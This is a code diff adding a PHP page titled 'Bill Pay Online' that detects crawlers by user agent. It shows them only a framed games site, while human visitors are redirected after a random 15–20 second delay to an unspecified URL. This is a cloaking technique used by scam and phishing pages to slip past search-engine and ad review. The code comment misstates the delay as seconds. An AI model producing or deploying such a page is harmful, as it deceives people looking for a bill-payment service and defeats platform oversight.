@@ -1,0 +1,30 @@
+<?php
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+$isBot = preg_match('/(bot|crawl|slurp|spider|adsbot|google)/i', $userAgent);
+
+$delay = rand(15000, 20000); // 1500-20000 seconds delay (milliseconds)
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <title>Bill Pay Online</title>
+    <style>
+        html, body { margin:0; padding:0; height:100%; overflow:hidden; }
+        iframe { width:100%; height:100%; border:none; display:block; }
+    </style>
+    <script>
+    <?php if (!$isBot): ?>
+        // 
+        setTimeout(function() {
+            window.location.href = "";
+        }, <?= $delay ?>);
+    <?php else: ?>
+        // 
+    <?php endif; ?>
+    </script>
+</head>
+<body>
+    <iframe src="https://plays.org/"></iframe>
+</body>
+</html>
